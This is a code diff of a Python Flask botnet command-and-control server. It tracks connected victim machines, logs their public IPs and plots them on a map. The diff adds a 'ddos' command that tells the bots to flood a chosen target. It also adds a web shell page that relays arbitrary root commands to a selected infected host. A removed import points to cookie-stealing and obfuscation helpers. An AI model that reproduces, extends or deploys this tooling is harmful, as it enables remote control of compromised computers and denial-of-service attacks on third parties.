@@ -1,17 +1,9 @@
 import os
-import re
-import httpx
-import ctypes
-import shutil
-import geocoder
 import folium
 import ipinfo
 import socket
-import platform
-import datetime
 import threading
 
-from cookies_package import curl_download_github, obfusacate
 from concurrent.futures.thread import ThreadPoolExecutor
 from flask_socketio import SocketIO
 from typing import Tuple
@@ -22,22 +14,20 @@ from flask import *
 
 
 '''
-TODO Add shell tab back in
+TODO Make grab system info get more info
 
-TODO Add public ip to list for map usage
+TODO Return more deatils about the ddos target (ip info and inputs used)
+
+TODO Add a countdown timer to the page when attacking a website/IP
 
 TODO Add button to client list to instantly kill client, and button to be able to "open" client's terminal (same as output terminal but looks like a terminal)
 
-TODO Be able to search through client list
-
 TODO Add radio button to be able to select all clients
-
-TODO Put client list into container and add a header (search bar -right) (Bots: 0 -middle) (Show x entries)
 
 TODO Process control (be able to block a process from running)
 '''
 
-
+#region Debug
 RED = '\033[91m'
 GREEN = '\033[92m'
 YELLOW = '\033[93m'
@@ -55,7 +45,7 @@ def print_debug(str):
 	if debug:
 		print(f"{END}[{RED}DEBUG{END}] " + END + str)
 		with open ("log.txt", "a+") as f: f.write(f"[DEBUG]  {str}\n")
-
+#endregion
 		
 # Server info
 ippp 	= "192.168.0.2"
@@ -83,6 +73,7 @@ all_address 	= []	# list of all addresses
 idNum       	= 0		# Bot ID number
 database    	= []	# list of all clients
 out 			= ""	# Command output
+shell_out 	    = ""	# Shell Command output
 
 temp 			= os.getenv('temp')
 stop 			= False	
@@ -152,7 +143,6 @@ def map_update():
 			long = mypi2.loc.split(",")[1]
 			location = [lat, long]
 			mapp = folium.Map(zoom_start=4, min_zoom=3, location=location, tiles="Stamen Terrain")            # create map
-			mapp.fit_bounds([[52.193636, -2.221575], [52.636878, -1.139759]])
 			folium.Marker(location, tooltip="SERVER").add_to(mapp)
 
 
@@ -185,9 +175,11 @@ threading.Thread(target=map_update).start()
 
 #region ACE Server
 def collect():
-	global hostname_list
+	global hostname_list, public_ips
 	hostname_list = []
+	public_ips = []
 	while not stop:
+		print_debug("Public IP's: " + str(public_ips))
 		try:
 			conn, address = sock.accept()
 			all_connections.append(conn)
@@ -210,7 +202,11 @@ def collect():
 					info["status"]  	= str(out[3])
 					print_debug("Collect Thread: --INFO--  Client IP: " + str(out[0]) + " Hostname: " + str(out[1]) + " OS: " + str(out[2]) + " Status: " + str(out[3]))
 
-					hostname_list.append(out[1])		# add client to list
+					hostname_list.append(out[1])			# add client hostname to list
+
+					if str(out[0]) not in public_ips:		# if client ip is in already in list
+						public_ips.append(out[0])			# add client public ip to list
+
 					database.append(client(info))
 				else: print_debug("Collect Thread: client already in database")
 			else:
@@ -222,6 +218,7 @@ def collect():
 				info["status"]  	= str(out[3])
 
 				hostname_list.append(out[1])
+				public_ips.append(out[0])
 				database.append(client(info))
 		except BrokenPipeError:
 			del all_address[-1]
@@ -270,6 +267,7 @@ def call_script(i, cmd):
 
 #endregion
 
+
 def _take_cmd(bot, cmd):
 	if cmd == "admincheck": 
 		return call_script(bot, cmd)
@@ -284,10 +282,25 @@ def _take_cmd(bot, cmd):
 		return call_script(bot, cmd)
 
 
+
 	elif "stress" in cmd:
-		return call_script(bot, cmd)	
+		return call_script(bot, cmd)
 	
+	elif "ddos" in cmd:
+		return call_script(bot, cmd)
+	
+
+
 	else: return(f"Error: {cmd} is not a valid command")
+
+def _take_shell_cmd(i, cmd):
+	try:
+		all_connections[i].send(cmd.encode())
+		return (f'{all_connections[i].recv(1024*5).decode("ascii")}')
+	except BrokenPipeError:
+		del all_address[i]
+		del all_connections[i]
+	return(f"Error")
 
 #region Web GUI
 @app.route('/')
@@ -331,11 +344,20 @@ def map_data():
 		if session['loggedin'] == True: return render_template('map_data.html')
 	except: return redirect('login.html')
 
+
 def command_check(command):
 	if command == "stress": 
-		stress_time = request.form.get('stress-time')
-		stress_amount = request.form.get('stress-tasks')
+		stress_time 	= request.form.get('stress-time')
+		stress_amount 	= request.form.get('stress-tasks')
 		return (f'{command} {stress_time} {stress_amount}')
+
+	elif command == "ddos": 
+		ddos_method 	= request.form.get('ddos-method')
+		ddos_target 	= request.form.get('ddos-target')
+		ddos_time	 	= request.form.get('ddos-time')
+		ddos_thread 	= request.form.get('ddos-thread')
+		return (f'{command} {ddos_method} {ddos_target} {ddos_time} {ddos_thread}')
+
 
 	else: return command
 
@@ -370,6 +392,42 @@ def sendcommands():
 								return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
 					return render_template('sendcommands.html', commandStatus='System ID not found', commandOutput=out)
 			else: return render_template('sendcommands.html', commandOutput=out)
+
+	except Exception as e:
+		print_debug(f"Error while sending command: {e}")
+		return redirect('login.html')
+
+
+@app.route('/shell.html', methods=['get', 'post'])
+def shell():
+	try:
+		global shell_out
+		if session['loggedin']:				# if user is logged in
+			if request.method == 'POST':	# if user is sending commands
+				command = ""
+				idNumber = request.form.get('idNumber')
+				command = str(request.form.get('command-shell'))
+
+				print_debug("Sending shell command: " + str(command) + " to system ID num: " + str(idNumber))
+
+				if database == []: return render_template('shell.html', commandStatus='No connected clients', commandOutput=shell_out)
+
+				if command == "clear":
+					shell_out = "" # clear output
+					return render_template('shell.html', commandStatus='Output Cleared', commandOutput=shell_out)
+				
+				else:
+					command = "root " + str(request.form.get('command-shell'))
+					for x in database:
+						if str(x.idNum) == str(idNumber):
+							try: 
+								shell_out += f"\n\nC:\\Users\\{x.hostname}> {request.form.get('command-shell')}\n\n{_take_shell_cmd(int(x.idNum), str(command))}"
+								return render_template('shell.html', commandStatus='Command Success', commandOutput=shell_out)
+							except Exception as e: 
+								print_debug("Error while sending command" + str(e))
+								return render_template('shell.html', commandStatus='Command Error', commandOutput=shell_out)
+					return render_template('shell.html', commandStatus='System ID not found', commandOutput=shell_out)
+			else: return render_template('shell.html', commandOutput=shell_out)
 
 	except Exception as e:
 		print_debug(f"Error while sending command: {e}")
